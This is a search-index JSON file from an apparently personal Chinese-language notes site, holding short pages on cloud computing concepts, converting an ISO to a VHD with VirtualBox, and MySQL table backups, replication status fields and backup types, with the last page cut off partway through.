{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\\\s\\\\u200b\\\\-]"},"docs":[{"location":"","text":"MarkDown_Log Note \u5982\u679c\u6ca1\u6709\u5b66\u4f1a\u53d7\u82e6\uff0c\u90a3\u4e48\u6240\u53d7\u7684\u82e6\u5c31\u767d\u53d7\u4e86 \u6e05\u5fc3\u5be1\u6b32","title":"Home"},{"location":"#markdown_log","text":"Note \u5982\u679c\u6ca1\u6709\u5b66\u4f1a\u53d7\u82e6\uff0c\u90a3\u4e48\u6240\u53d7\u7684\u82e6\u5c31\u767d\u53d7\u4e86 \u6e05\u5fc3\u5be1\u6b32","title":"MarkDown_Log"},{"location":"Cloud_Computing/","text":"\u4e91\u8ba1\u7b97\u662f\u4e00\u79cd\u63d0\u4f9b\u548c\u4f7f\u7528\u57fa\u4e8e\u4e92\u8054\u7f51\u7684\u8ba1\u7b97\u8d44\u6e90\u548c\u670d\u52a1\u7684\u6a21\u5f0f\uff0c\u8fd9\u4e9b\u8d44\u6e90\u548c\u670d\u52a1\u5305\u62ec\u5404\u79cd\u5de5\u5177\u548c\u5e94\u7528\uff0c\u53ef\u4ee5\u6309\u9700\u5206\u914d\u548c\u4f7f\u7528\u3002\u4e91\u8ba1\u7b97\u7684\u6838\u5fc3\u7ec4\u6210\u90e8\u5206\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a 1.\u670d\u52a1\u6a21\u578b \uff1a \u57fa\u7840\u8bbe\u65bd\u5373\u670d\u52a1\uff08IaaS\uff09 \uff1a\u63d0\u4f9b\u865a\u62df\u5316\u7684\u8ba1\u7b97\u8d44\u6e90\uff0c\u5982\u865a\u62df\u673a\u3001\u5b58\u50a8\u7a7a\u95f4\u548c\u7f51\u7edc\u3002 \u5e73\u53f0\u5373\u670d\u52a1\uff08PaaS\uff09 \uff1a\u63d0\u4f9b\u7f16\u7a0b\u73af\u5883\u548c\u5de5\u5177\uff0c\u5e2e\u52a9\u5f00\u53d1\u8005\u521b\u5efa\u548c\u90e8\u7f72\u5e94\u7528\u3002 \u8f6f\u4ef6\u5373\u670d\u52a1\uff08SaaS\uff09 \uff1a\u63d0\u4f9b\u57fa\u4e8e\u4e91\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u8bbf\u95ee\u3002 2 .\u90e8\u7f72\u6a21\u578b \uff1a \u516c\u6709\u4e91 \uff1a\u7531\u7b2c\u4e09\u65b9\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u7ba1\u7406\u548c\u7ef4\u62a4\uff0c\u670d\u52a1\u5bf9\u6240\u6709\u7528\u6237\u5f00\u653e\u3002 \u79c1\u6709\u4e91 \uff1a\u4e13\u4e3a\u5355\u4e00\u7ec4\u7ec7\u8bbe\u8ba1\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u6216\u7531\u7b2c\u4e09\u65b9\u6258\u7ba1\u3002 \u6df7\u5408\u4e91 \uff1a\u7ed3\u5408\u516c\u6709\u4e91\u548c\u79c1\u6709\u4e91\u7684\u7279\u70b9\uff0c\u63d0\u4f9b\u66f4\u5927\u7684\u7075\u6d3b\u6027\u548c\u4f18\u5316\u7684\u8d44\u6e90\u914d\u7f6e\u3002 3.\u6838\u5fc3\u6280\u672f \uff1a \u865a\u62df\u5316 \uff1a\u521b\u5efa\u865a\u62df\u7248\u672c\u7684\u8ba1\u7b97\u8d44\u6e90\uff0c\u5982\u670d\u52a1\u5668\u3001\u5b58\u50a8\u8bbe\u5907\u548c\u7f51\u7edc\u8d44\u6e90\u3002 \u5bb9\u5668\u5316 \uff1a\u63d0\u4f9b\u8f7b\u91cf\u7ea7\u3001\u53ef\u79fb\u690d\u7684\u8fd0\u884c\u73af\u5883\uff0c\u7528\u4e8e\u6253\u5305\u548c\u8fd0\u884c\u5e94\u7528\u3002 \u81ea\u52a8\u5316\u548c\u7f16\u6392 \uff1a\u81ea\u52a8\u5316\u8d44\u6e90\u7684\u7ba1\u7406\u548c\u914d\u7f6e\uff0c\u63d0\u9ad8\u6548\u7387\u548c\u7075\u6d3b\u6027\u3002 4.\u5b58\u50a8\u548c\u6570\u636e\u5e93 \uff1a \u63d0\u4f9b\u4e91\u5b58\u50a8\u670d\u52a1\uff0c\u5982\u5bf9\u8c61\u5b58\u50a8\u3001\u6587\u4ef6\u5b58\u50a8\u548c\u5757\u5b58\u50a8\u3002 \u63d0\u4f9b\u5404\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5e93\u670d\u52a1\uff0c\u5305\u62ec\u5173\u7cfb\u578b\u6570\u636e\u5e93\u548cNoSQL\u6570\u636e\u5e93\u3002 5.\u7f51\u7edc\u548c\u5185\u5bb9\u5206\u53d1 \uff1a \u63d0\u4f9b\u4e91\u4e2d\u7684\u7f51\u7edc\u670d\u52a1\uff0c\u5982\u865a\u62df\u79c1\u6709\u7f51\u7edc\uff08VPN\uff09\u3001\u8d1f\u8f7d\u5747\u8861\u548c\u5185\u5bb9\u5206\u53d1\u7f51\u7edc\uff08CDN\uff09\u3002 6.\u5b89\u5168\u548c\u5408\u89c4 \uff1a \u63d0\u4f9b\u6570\u636e\u52a0\u5bc6\u3001\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u3001\u5b89\u5168\u5408\u89c4\u548c\u7f51\u7edc\u5b89\u5168\u670d\u52a1\u3002 7.\u5206\u6790\u548c\u673a\u5668\u5b66\u4e60 \uff1a \u63d0\u4f9b\u6570\u636e\u5206\u6790\u3001\u5927\u6570\u636e\u5904\u7406\u548c\u673a\u5668\u5b66\u4e60\u670d\u52a1\uff0c\u5e2e\u52a9\u7528\u6237\u4ece\u5927\u91cf\u6570\u636e\u4e2d\u83b7\u53d6\u6d1e\u89c1\u3002 8.\u5e94\u7528\u96c6\u6210\u548c\u5f00\u53d1\u5de5\u5177 \uff1a \u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\uff08API\uff09\u3001\u5fae\u670d\u52a1\u67b6\u6784\u548c\u5176\u4ed6\u5f00\u53d1\u5de5\u5177\u3002 9.\u7ba1\u7406\u548c\u76d1\u63a7 \uff1a \u63d0\u4f9b\u8d44\u6e90\u76d1\u63a7\u3001\u65e5\u5fd7\u7ba1\u7406\u3001\u81ea\u52a8\u5316\u5de5\u5177\u548c\u6027\u80fd\u5206\u6790\u3002 \u4e91\u8ba1\u7b97\u7684\u5173\u952e\u4f18\u52bf\u5305\u62ec\u6210\u672c\u6548\u7387\u3001\u7075\u6d3b\u6027\u3001\u53ef\u6269\u5c55\u6027\u548c\u53ef\u9760\u6027\u3002\u5b83\u5df2\u6210\u4e3a\u4f01\u4e1a\u548c\u4e2a\u4eba\u5b58\u50a8\u6570\u636e\u3001\u6258\u7ba1\u5e94\u7528\u7a0b\u5e8f\u548c\u6267\u884c\u8ba1\u7b97\u4efb\u52a1\u7684\u6d41\u884c\u65b9\u5f0f\u3002\u968f\u7740\u6280\u672f\u7684\u53d1\u5c55\uff0c\u4e91\u8ba1\u7b97\u7684\u5e94\u7528\u573a\u666f\u4e5f\u5728\u4e0d\u65ad\u6269\u5c55\u548c\u6df1\u5316\u3002","title":"Index"},{"location":"Cloud_Computing/iso%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%BAvhd%E6%A0%BC%E5%BC%8F/","text":"Oracle VM VirtualBox\u4e0b\u8f7d\u5730\u5740\uff1a Downloads \u2013 Oracle VM VirtualBox \u5c06ISO\u955c\u50cf\u6587\u4ef6\u8f6c\u6362\u4e3aVHD\uff08Virtual Hard Disk\uff09\u683c\u5f0f\u901a\u5e38\u4e0d\u662f\u4e00\u4e2a\u76f4\u63a5\u7684\u8fc7\u7a0b\uff0c\u56e0\u4e3aISO\u548cVHD\u5728\u529f\u80fd\u4e0a\u6709\u6240\u4e0d\u540c\uff1a ISO\u6587\u4ef6 \u662f\u5149\u76d8\u955c\u50cf\u6587\u4ef6\uff0c\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u64cd\u4f5c\u7cfb\u7edf\u5b89\u88c5\u5a92\u4f53\u3002 VHD\u6587\u4ef6 \u662f\u4e00\u79cd\u865a\u62df\u786c\u76d8\u6587\u4ef6\u683c\u5f0f\uff0c\u7528\u4e8e\u5728\u865a\u62df\u5316\u8f6f\u4ef6\u4e2d\u6a21\u62df\u7269\u7406\u786c\u76d8\u3002 \u8981\u5c06ISO\u8f6c\u6362\u4e3aVHD\uff0c\u4f60\u9700\u8981\u901a\u8fc7\u865a\u62df\u5316\u8f6f\u4ef6\uff08\u5982Oracle VM VirtualBox\uff09\u4f7f\u7528ISO\u6587\u4ef6\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u5c06\u5176\u5b89\u88c5\u5728\u4e00\u4e2a\u65b0\u7684VHD\u6587\u4ef6\u4e2d\u3002\u4ee5\u4e0b\u662f\u4f7f\u7528Oracle VM VirtualBox\u8fdb\u884c\u8f6c\u6362\u7684\u57fa\u672c\u6b65\u9aa4\uff1a 1.\u6253\u5f00Oracle VM VirtualBox \uff1a \u542f\u52a8VirtualBox\u5e94\u7528\u7a0b\u5e8f\u3002 2.\u521b\u5efa\u65b0\u7684\u865a\u62df\u673a \uff1a \u70b9\u51fb\u201c\u65b0\u5efa\u201d\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u865a\u62df\u673a\u3002 \u8f93\u5165\u865a\u62df\u673a\u7684\u540d\u79f0\u3001\u9009\u62e9\u64cd\u4f5c\u7cfb\u7edf\u7684\u7c7b\u578b\u548c\u7248\u672c\u3002 \u5206\u914d\u8db3\u591f\u7684\u5185\u5b58\u5927\u5c0f\u7ed9\u865a\u62df\u673a\u3002 3.\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u865a\u62df\u786c\u76d8\uff08VHD\uff09 \uff1a \u5728\u521b\u5efa\u865a\u62df\u673a\u7684\u8fc7\u7a0b\u4e2d\uff0c\u9009\u62e9\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u865a\u62df\u786c\u76d8\u3002 \u9009\u62e9VHD\u4f5c\u4e3a\u786c\u76d8\u6587\u4ef6\u7c7b\u578b\u3002 \u8bbe\u7f6e\u786c\u76d8\u7684\u5927\u5c0f\u3002 \u5b8c\u6210\u865a\u62df\u673a\u7684\u521b\u5efa\u8fc7\u7a0b\u3002 4.\u6302\u8f7dISO\u6587\u4ef6 \uff1a \u5728\u521b\u5efa\u7684\u865a\u62df\u673a\u8bbe\u7f6e\u4e2d\uff0c\u627e\u5230\u5b58\u50a8\u8bbe\u7f6e\u3002 \u5728\u865a\u62df\u5149\u9a71\u4e2d\u6302\u8f7d\u4f60\u7684ISO\u6587\u4ef6\u3002 5.\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf \uff1a \u542f\u52a8\u865a\u62df\u673a\uff0c\u5b83\u5c06\u4ece\u6302\u8f7d\u7684ISO\u6587\u4ef6\u542f\u52a8\u3002 \u6309\u7167\u5c4f\u5e55\u4e0a\u7684\u63d0\u793a\u5b8c\u6210\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u88c5\u3002 6.\u64cd\u4f5c\u7cfb\u7edf\u5b89\u88c5\u5b8c\u6210\u540e \uff1a \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u4f60\u5c06\u62e5\u6709\u4e00\u4e2a\u5305\u542b\u6240\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\u7684VHD\u6587\u4ef6\u3002 7.\u5bfc\u51faVHD\u6587\u4ef6 \uff1a \u5982\u679c\u9700\u8981\uff0c\u53ef\u4ee5\u5728VirtualBox\u7684\u865a\u62df\u4ecb\u8d28\u7ba1\u7406\u5668\u4e2d\u627e\u5230VHD\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5b9e\u9645\u4e0a\u662f\u5728VHD\u4e2d\u5b89\u88c5\u4e86ISO\u955c\u50cf\u4e2d\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u5c06ISO\u6587\u4ef6\u683c\u5f0f\u8f6c\u6362\u4e3aVHD\u6587\u4ef6\u683c\u5f0f\u3002\u76f4\u63a5\u8f6c\u6362\u901a\u5e38\u6ca1\u6709\u5b9e\u9645\u7684\u5e94\u7528\u573a\u666f\uff0c\u56e0\u4e3a\u8fd9\u4e24\u79cd\u683c\u5f0f\u7528\u9014\u5b8c\u5168\u4e0d\u540c\u3002","title":"iso\u683c\u5f0f\u8f6c\u6362\u4e3avhd\u683c\u5f0f"},{"location":"database/mysql/BAK_TABLE/","text":"\u53ea\u5907\u4efd\u67d0\u4e9b\u8868\uff0c\u5728\u6570\u636e\u5e93\u5185\u5907\u4efd \u4f7f\u7528 CREATE TABLE ... AS SELECT ... \u547d\u4ee4\u6765\u521b\u5efa\u65b0\u8868\u7684\u786e\u4f1a\u9020\u6210\u539f\u59cb\u8868\u7684\u7d22\u5f15\u548c\u67d0\u4e9b\u8868\u5c5e\u6027\u4e22\u5931\u3002\u8fd9\u4e2a\u547d\u4ee4\u53ea\u4f1a\u590d\u5236\u6570\u636e\u548c\u57fa\u672c\u7684\u8868\u7ed3\u6784\uff0c\u4e0d\u5305\u62ec\u7d22\u5f15\u3001\u5916\u952e\u3001\u89e6\u53d1\u5668\u3001\u9ed8\u8ba4\u503c\u8bbe\u5b9a\u6216\u5b58\u50a8\u8fc7\u7a0b\u7b49\u3002 \u5982\u679c\u4f60\u9700\u8981\u5907\u4efd\u4e00\u4e2a\u8868\u5e76\u4fdd\u7559\u5176\u5b8c\u6574\u7ed3\u6784\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u4f60\u9700\u8981\uff1a \u9996\u5148\u4f7f\u7528 SHOW CREATE TABLE example; \u547d\u4ee4\u6765\u83b7\u53d6\u521b\u5efa\u539f\u59cb\u8868\u7684\u5b8c\u6574 SQL \u8bed\u53e5\u3002 \u4fee\u6539\u8fd9\u4e2a\u5b8c\u6574 SQL \u8bed\u53e5\u6765\u521b\u5efa\u65b0\u7684\u5907\u4efd\u8868\uff0c\u6bd4\u5982\u5c06\u8868\u540d\u6539\u4e3a example_20231118 \u3002 \u6267\u884c\u4fee\u6539\u540e\u7684\u521b\u5efa\u8868 SQL \u8bed\u53e5\u6765\u521b\u5efa\u65b0\u7684\u5907\u4efd\u8868\uff0c\u8fd9\u6837\u5c31\u5305\u542b\u4e86\u7d22\u5f15\u548c\u6240\u6709\u539f\u59cb\u8868\u7684\u5c5e\u6027\u3002 \u7136\u540e\u4f7f\u7528 INSERT INTO example_20231118 SELECT * FROM example; \u6765\u590d\u5236\u6570\u636e\u3002 \u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u4f60\u7684\u5907\u4efd\u8868\u4fdd\u7559\u4e86\u5b8c\u6574\u7684\u7ed3\u6784\u548c\u7d22\u5f15\u3002","title":"\u5728\u6570\u636e\u5e93\u4e2d\u5907\u4efd\u67d0\u4e9b\u8868"},{"location":"database/mysql/BAK_TABLE/#_1","text":"\u4f7f\u7528 CREATE TABLE ... AS SELECT ... \u547d\u4ee4\u6765\u521b\u5efa\u65b0\u8868\u7684\u786e\u4f1a\u9020\u6210\u539f\u59cb\u8868\u7684\u7d22\u5f15\u548c\u67d0\u4e9b\u8868\u5c5e\u6027\u4e22\u5931\u3002\u8fd9\u4e2a\u547d\u4ee4\u53ea\u4f1a\u590d\u5236\u6570\u636e\u548c\u57fa\u672c\u7684\u8868\u7ed3\u6784\uff0c\u4e0d\u5305\u62ec\u7d22\u5f15\u3001\u5916\u952e\u3001\u89e6\u53d1\u5668\u3001\u9ed8\u8ba4\u503c\u8bbe\u5b9a\u6216\u5b58\u50a8\u8fc7\u7a0b\u7b49\u3002 \u5982\u679c\u4f60\u9700\u8981\u5907\u4efd\u4e00\u4e2a\u8868\u5e76\u4fdd\u7559\u5176\u5b8c\u6574\u7ed3\u6784\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u4f60\u9700\u8981\uff1a \u9996\u5148\u4f7f\u7528 SHOW CREATE TABLE example; \u547d\u4ee4\u6765\u83b7\u53d6\u521b\u5efa\u539f\u59cb\u8868\u7684\u5b8c\u6574 SQL \u8bed\u53e5\u3002 \u4fee\u6539\u8fd9\u4e2a\u5b8c\u6574 SQL \u8bed\u53e5\u6765\u521b\u5efa\u65b0\u7684\u5907\u4efd\u8868\uff0c\u6bd4\u5982\u5c06\u8868\u540d\u6539\u4e3a example_20231118 \u3002 \u6267\u884c\u4fee\u6539\u540e\u7684\u521b\u5efa\u8868 SQL \u8bed\u53e5\u6765\u521b\u5efa\u65b0\u7684\u5907\u4efd\u8868\uff0c\u8fd9\u6837\u5c31\u5305\u542b\u4e86\u7d22\u5f15\u548c\u6240\u6709\u539f\u59cb\u8868\u7684\u5c5e\u6027\u3002 \u7136\u540e\u4f7f\u7528 INSERT INTO example_20231118 SELECT * FROM example; \u6765\u590d\u5236\u6570\u636e\u3002 \u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u4f60\u7684\u5907\u4efd\u8868\u4fdd\u7559\u4e86\u5b8c\u6574\u7684\u7ed3\u6784\u548c\u7d22\u5f15\u3002","title":"\u53ea\u5907\u4efd\u67d0\u4e9b\u8868\uff0c\u5728\u6570\u636e\u5e93\u5185\u5907\u4efd"},{"location":"database/mysql/SHOW_SLAVE_STATUS/","text":"\u4e0b\u9762\u662f SHOW SLAVE STATUS; \u547d\u4ee4\u8fd4\u56de\u7684\u5b57\u6bb5\u7684\u5b8c\u6574\u5217\u8868\u53ca\u5176\u89e3\u91ca\uff1a Slave_IO_State : \u663e\u793a\u4ece\u670d\u52a1\u5668 I/O \u7ebf\u7a0b\u7684\u5f53\u524d\u72b6\u6001\u3002 Master_Host : \u4e3b\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d\u3002 Master_User : \u7528\u4e8e\u8fde\u63a5\u4e3b\u670d\u52a1\u5668\u7684 MySQL \u7528\u6237\u540d\u3002 Master_Port : \u4e3b\u670d\u52a1\u5668\u7684\u7aef\u53e3\u53f7\u3002 Connect_Retry : \u8fde\u63a5\u5931\u8d25\u540e\u91cd\u8bd5\u8fde\u63a5\u4e3b\u670d\u52a1\u5668\u7684\u65f6\u95f4\u95f4\u9694\u3002 Master_Log_File : \u4ece\u670d\u52a1\u5668\u6b63\u5728\u8bfb\u53d6\u7684\u4e3b\u670d\u52a1\u5668\u4e8c\u8fdb\u5236\u65e5\u5fd7\u6587\u4ef6\u540d\u3002 Read_Master_Log_Pos : \u4ece\u670d\u52a1\u5668\u5df2\u8bfb\u53d6\u7684\u4e3b\u670d\u52a1\u5668\u4e8c\u8fdb\u5236\u65e5\u5fd7\u7684\u4f4d\u7f6e\u3002 Relay_Log_File : \u4ece\u670d\u52a1\u5668\u6b63\u5728\u4f7f\u7528\u7684\u4e2d\u7ee7\u65e5\u5fd7\u6587\u4ef6\u7684\u540d\u79f0\u3002 Relay_Log_Pos : \u4ece\u670d\u52a1\u5668\u4e2d\u7ee7\u65e5\u5fd7\u6587\u4ef6\u7684\u5f53\u524d\u4f4d\u7f6e\u3002 Relay_Master_Log_File : \u4e2d\u7ee7\u65e5\u5fd7\u4e2d\u5bf9\u5e94\u7684\u4e3b\u670d\u52a1\u5668\u4e8c\u8fdb\u5236\u65e5\u5fd7\u6587\u4ef6\u540d\u3002 Slave_IO_Running : \u590d\u5236 I/O \u7ebf\u7a0b\u662f\u5426\u6b63\u5728\u8fd0\u884c\u3002 Slave_SQL_Running : \u590d\u5236 SQL \u7ebf\u7a0b\u662f\u5426\u6b63\u5728\u8fd0\u884c\u3002 Replicate_Do_DB : \u6307\u5b9a\u8981\u590d\u5236\u7684\u6570\u636e\u5e93\u3002 Replicate_Ignore_DB : \u6307\u5b9a\u4e0d\u590d\u5236\u7684\u6570\u636e\u5e93\u3002 Replicate_Do_Table : \u6307\u5b9a\u8981\u590d\u5236\u7684\u8868\u3002 Replicate_Ignore_Table : \u6307\u5b9a\u4e0d\u590d\u5236\u7684\u8868\u3002 Replicate_Wild_Do_Table : \u4f7f\u7528\u901a\u914d\u7b26\u6307\u5b9a\u8981\u590d\u5236\u7684\u8868\u3002 Replicate_Wild_Ignore_Table : \u4f7f\u7528\u901a\u914d\u7b26\u6307\u5b9a\u4e0d\u590d\u5236\u7684\u8868\u3002 Last_Errno : \u6700\u540e\u4e00\u4e2a SQL \u9519\u8bef\u7684\u7f16\u53f7\u3002 Last_Error : \u6700\u540e\u4e00\u4e2a SQL \u9519\u8bef\u7684\u6587\u672c\u63cf\u8ff0\u3002 Skip_Counter : \u8df3\u8fc7\u7684\u4e8b\u4ef6\u6570\u3002 Exec_Master_Log_Pos : \u4ece\u670d\u52a1\u5668\u6267\u884c\u7684\u4e3b\u670d\u52a1\u5668\u4e8c\u8fdb\u5236\u65e5\u5fd7\u7684\u4f4d\u7f6e\u3002 Relay_Log_Space : \u6240\u6709\u4e2d\u7ee7\u65e5\u5fd7\u6587\u4ef6\u7684\u603b\u5927\u5c0f\u3002 Until_Condition : \u63a7\u5236\u590d\u5236\u505c\u6b62\u7684\u6761\u4ef6\u3002 Until_Log_File : \u63a7\u5236\u590d\u5236\u505c\u6b62\u7684\u4e8c\u8fdb\u5236\u65e5\u5fd7\u6587\u4ef6\u540d\u3002 Until_Log_Pos : \u63a7\u5236\u590d\u5236\u505c\u6b62\u7684\u4e8c\u8fdb\u5236\u65e5\u5fd7\u4f4d\u7f6e\u3002 Master_SSL_Allowed : \u662f\u5426\u5141\u8bb8 SSL \u8fde\u63a5\u3002 Master_SSL_CA_File : SSL CA \u6587\u4ef6\u7684\u8def\u5f84\u3002 Master_SSL_CA_Path : SSL CA \u8def\u5f84\u3002 Master_SSL_Cert : SSL \u8bc1\u4e66\u7684\u8def\u5f84\u3002 Master_SSL_Cipher : SSL \u5bc6\u7801\u5957\u4ef6\u3002 Master_SSL_Key : SSL \u5bc6\u94a5\u7684\u8def\u5f84\u3002 Seconds_Behind_Master : \u4ece\u670d\u52a1\u5668\u843d\u540e\u4e3b\u670d\u52a1\u5668\u7684\u79d2\u6570\u3002 Master_SSL_Verify_Server_Cert : \u662f\u5426\u9a8c\u8bc1\u4e3b\u670d\u52a1\u5668\u7684 SSL \u8bc1\u4e66\u3002 Last_IO_Errno : \u6700\u540e\u4e00\u4e2a I/O \u9519\u8bef\u7684\u7f16\u53f7\u3002 Last_IO_Error : \u6700\u540e\u4e00\u4e2a I/O \u9519\u8bef\u7684\u6587\u672c\u63cf\u8ff0\u3002 Last_SQL_Errno : \u6700\u540e\u4e00\u4e2a SQL \u9519\u8bef\u7684\u7f16\u53f7\u3002 Last_SQL_Error : \u6700\u540e\u4e00\u4e2a SQL \u9519\u8bef\u7684\u6587\u672c\u63cf\u8ff0\u3002 Replicate_Ignore_Server_Ids : \u5ffd\u7565\u7279\u5b9a\u670d\u52a1\u5668 ID \u7684\u590d\u5236\u3002 Master_Server_Id : \u4e3b\u670d\u52a1\u5668\u7684\u670d\u52a1\u5668 ID\u3002 Master_UUID : \u4e3b\u670d\u52a1\u5668\u7684\u552f\u4e00 ID\u3002 Master_Info_File : \u5b58\u50a8\u4e3b\u670d\u52a1\u5668\u4fe1\u606f\u7684\u6587\u4ef6\u540d\u3002 SQL_Delay : \u4ece\u670d\u52a1\u5668\u5ef6\u8fdf\u6267\u884c\u4e8c\u8fdb\u5236\u65e5\u5fd7\u4e8b\u4ef6\u7684\u79d2\u6570\u3002 SQL_Remaining_Delay : \u5269\u4f59\u7684 SQL \u5ef6\u8fdf\u65f6\u95f4\u3002 Slave_SQL_Running_State : \u4ece\u670d\u52a1\u5668 SQL \u7ebf\u7a0b\u7684\u5f53\u524d\u72b6\u6001\u3002 Master_Retry_Count : \u65ad\u5f00\u8fde\u63a5\u540e\u91cd\u8bd5\u8fde\u63a5\u4e3b\u670d\u52a1\u5668\u7684\u6b21\u6570\u3002 Master_Bind : \u7528\u4e8e\u8fde\u63a5\u4e3b\u670d\u52a1\u5668\u7684\u7f51\u7edc\u63a5\u53e3\u3002 Last_IO_Error_Timestamp : \u6700\u540e\u4e00\u4e2a I/O \u9519\u8bef\u7684\u65f6\u95f4\u6233\u3002 Last_SQL_Error_Timestamp : \u6700\u540e\u4e00\u4e2a SQL \u9519\u8bef\u7684\u65f6\u95f4\u6233\u3002 Master_SSL_Crl : SSL CRL \u6587\u4ef6\u7684\u8def\u5f84\u3002 Master_SSL_Crlpath : SSL CRL \u8def\u5f84\u3002 Retrieved_Gtid_Set : \u4ece\u4e3b\u670d\u52a1\u5668\u68c0\u7d22\u7684 GTID \u96c6\u5408\u3002 Executed_Gtid_Set : \u5df2\u5728\u4ece\u670d\u52a1\u5668\u4e0a\u6267\u884c\u7684 GTID \u96c6\u5408\u3002 Auto_Position : \u662f\u5426\u4f7f\u7528 GTID \u81ea\u52a8\u5b9a\u4f4d\u590d\u5236\u3002 Replicate_Rewrite_DB : \u590d\u5236\u65f6\u91cd\u5199\u7684\u6570\u636e\u5e93\u540d\u79f0\u3002 Channel_Name : \u590d\u5236\u901a\u9053\u7684\u540d\u79f0\uff08\u7528\u4e8e\u591a\u6e90\u590dlication\uff09\u3002 Master_TLS_Version : \u7528\u4e8e\u590d\u5236\u7684 TLS \u7248\u672c\u3002 \u8fd9\u4e9b\u5b57\u6bb5\u63d0\u4f9b\u4e86\u5173\u4e8e MySQL \u4ece\u670d\u52a1\u5668\u590d\u5236\u72b6\u6001\u7684\u5168\u9762\u4fe1\u606f\uff0c\u5305\u62ec\u5f53\u524d\u64cd\u4f5c\u3001\u914d\u7f6e\u3001\u9519\u8bef\u4fe1\u606f\u4ee5\u53ca\u4e0e\u4e3b\u670d\u52a1\u5668\u7684\u8fde\u63a5\u8be6\u60c5\u3002\u4e0d\u540c\u7684 MySQL \u7248\u672c\u53ef\u80fd\u4f1a\u6709\u989d\u5916\u7684\u5b57\u6bb5\u6216\u8005\u8f7b\u5fae\u4e0d\u540c\u7684\u5b57\u6bb5\u3002\u8fd9\u4e9b\u4fe1\u606f\u5bf9\u4e8e\u7ef4\u62a4\u3001\u76d1\u63a7\u548c\u6545\u969c\u6392\u9664\u6570\u636e\u5e93\u590d\u5236\u81f3\u5173\u91cd\u8981\u3002","title":"SHOW_SLAVE_STATUS"},{"location":"database/mysql/bak/","text":"\u5907\u4efd\u4e0e\u6062\u590d \u5907\u4efd\u662f\u5c06\u7cfb\u7edf\u6216\u8005\u6570\u636e\u5e93\u4e2d\u91cd\u8981\u662f\u6570\u636e\u4fdd\u5b58\u8d77\u6765\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5728\u707e\u96be\u6216\u6545\u969c\u53d1\u751f\u7684\u65f6\u5019\uff0c\u786e\u4fdd\u6570\u636e\u4e0d\u4e22\u5931\u6216\u8005\u662f\u6700\u5c0f\u7a0b\u5ea6\u7684\u4e22\u5931 \u5907\u4efd\u7b56\u7565\u8981\u6c42\uff1a \u7b2c\u4e09\u65b9\u5907\u4efd\u8f6f\u4ef6 bacula (\u5f00\u6e90\u5907\u4efd\u8f6f\u4ef6)\u7b49 \u4e00\u3001\u5907\u4efd\u7684\u5206\u7c7b 1\u3001\u6839\u636e\u5907\u4efd\u65b9\u6cd5\u5206 1\uff09\u51b7\u5907\u4efd(cold backup) \u4e5f\u53eb\u79bb\u7ebf\u5907\u4efd(offline backup) \u8fd9\u79cd\u5907\u4efd\u6700\u7b80\u5355\uff0c\u76f4\u63a5\u62f7\u8d1d\u7269\u7406\u6587\u4ef6 \u9700\u8981\u5173\u95ed\u6570\u636e\u5e93\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u5907\u4efd 2\uff09\u70ed\u5907\u4efd(hot backup) \u4e5f\u53eb\u5728\u7ebf\u5907\u4efd(online backup) \u65e0\u9700\u5173\u95ed\u6570\u636e\u5e93\uff0c\u76f4\u63a5\u5728\u7ebf\u5907\u4efd 3\uff09\u6e29\u5907\uff08warm backup\uff09 \u65e0\u9700\u5173\u95ed\u6570\u636e\u5e93\uff0c\u4f46\u662f\u4f1a\u5bf9\u5f53\u524d\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u6709\u5f71\u54cd\uff0c\u56e0\u4e3a\u4f1a\u7ed9\u6570\u636e\u5e93\u52a0\u5168\u5c40\u8bfb\u9501 2\u3001\u6839\u636e\u5907\u4efd\u540e\u7684\u6587\u4ef6\u5206 \u903b\u8f91\u5907\u4efd \u6307\u5907\u4efd\u51fa\u6765\u7684\u6587\u4ef6\u662f\u53ef\u8bfb\u7684\uff0c\u4e5f\u5c31\u662f\u6587\u672c\u6587\u4ef6 \u5982\uff1amysqldump \u7269\u7406\u5907\u4efd \u6307\u5907\u4efd\u6570\u636e\u5e93\u7684\u7269\u7406\u6587\u4ef6 \u5982\uff1aibbackup 3\u3001\u6309\u7167\u5907\u4efd\u6570\u636e\u5e93\u7684\u5185\u5bb9\u6765\u5206 \u5b8c\u5168\u5907\u4efd\uff1a \u4e0d\u7ba1\u662f\u5426\u53d1\u751f\u53d8\u5316\uff0c\u5c06\u5168\u5e93\u90fd\u5907\u4efd \u589e\u91cf\u5907\u4efd\uff1a \u4ec5\u5907\u4efd\u4e0a\u6b21\u5907\u4efd\u5230\u8fd9\u6b21\u5907\u4efd\u4e4b\u95f4\u53d1\u751f\u53d8\u5316\u7684\u90e8\u5206 \u65e5\u5fd7\u5907\u4efd\uff1a 